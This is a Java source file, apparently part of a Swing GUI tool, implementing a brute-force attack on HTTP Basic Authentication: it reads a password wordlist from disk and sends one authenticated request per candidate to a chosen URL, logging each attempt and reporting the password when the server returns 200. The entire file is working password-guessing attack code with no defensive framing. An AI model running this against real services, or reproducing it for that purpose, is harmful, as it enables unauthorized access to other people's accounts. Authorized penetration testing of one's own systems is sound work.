package model;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;

import javax.swing.JOptionPane;

import org.apache.commons.codec.binary.Base64;

import view.GUI_Main;

public class Http_Authentication_basic{
	
	private String link;
	private String method;
	private String username;
	private String wordlistPath;
	private GUI_Main window;
	
	
	public Http_Authentication_basic(GUI_Main window,String link,String method,String username,String wordlistPath){
		this.link = link;
		this.method = method;
		this.username = username;
		this.wordlistPath = wordlistPath;
		this.window = window;
		
	}
	
	public boolean bruteForce()
	{
		
		String password = "";
		try {			
			// request 
			URL url = new URL (link);
			HttpURLConnection connection=null;       	
        	
			//files
			RandomAccessFile aFile = null;
					try {
						aFile = new RandomAccessFile(wordlistPath, "r");
					} catch (Exception e) {
						JOptionPane.showMessageDialog(null,"check your wordlist path","ERROR",JOptionPane.ERROR_MESSAGE);
						
						return false;
					}
	        FileChannel inChannel = aFile.getChannel();
	        MappedByteBuffer buffer = inChannel.map(FileChannel.MapMode.READ_ONLY, 0, inChannel.size());
	        buffer.load();
	        byte[] aray =new  byte[400] ;
	        int count = 0;
	        String oldLog = window.getLog();
	        for (int i = 0; i < buffer.limit(); i++)
	        {
	        	byte currentByte = buffer.get();
	        	if (currentByte==10)//10 return line
	        	{	        		
	        		//do the test		       
	        		try {
	        			password=new String(aray, "UTF-8");    			
	        			connection = (HttpURLConnection) url.openConnection();		        			
	                    Base64 coder = new Base64();
	                    
	                    
	                    window.appendToLogInAttack(oldLog,"Trying : " + username.trim() + " : " + password.trim() +"\n", window.gris);
	                    String encoding = coder.encodeAsString(new String(username.trim() + ":" + password.trim()).getBytes());		                    
	                    connection.setRequestMethod(method);
	                    connection.setDoOutput(true);
	                    connection.setRequestProperty  ("Authorization", "Basic " + encoding);         
	        			
	        			if (connection.getResponseCode()==200)
	        			{
	        				window.appendToLog(link.trim(), GUI_Main.green);
	        				window.appendToLog("user : "+username, GUI_Main.green);
	        				String msg ="password Founded : " + password.trim() ;
	        				window.appendToLog(msg, GUI_Main.blue);
	        				//here i found the password
	        				window.changeStartBtn();
	        				return true;
	        				
	        			}
	        			connection.disconnect();
	        		} catch (UnsupportedEncodingException e) {}
	        		count=0;
	        		aray = new byte[400];
	        		
	        	}     	
	        	try {
		        	aray[count] =  currentByte;		        	
		        	count +=1;
				} catch (Exception e) {	
					aray = new byte[10000];
				}
	        	
	        }
	        buffer.clear(); // do something with the data and clear/compact it.
	        inChannel.close();
	        aFile.close();
	        window.appendToLog("Sorry password doesn't exist in this list :( \n", GUI_Main.red);
	        window.changeStartBtn();
	       
		} catch (FileNotFoundException e) {
//			JOptionPane.showMessageDialog(null,"File note found ","ERROR",JOptionPane.ERROR_MESSAGE);
			window.appendToLog("File note found", GUI_Main.red);
			return false;
		} catch (IOException e) {
			e.printStackTrace();
		}
		 return false;
		
		
	}

	
}
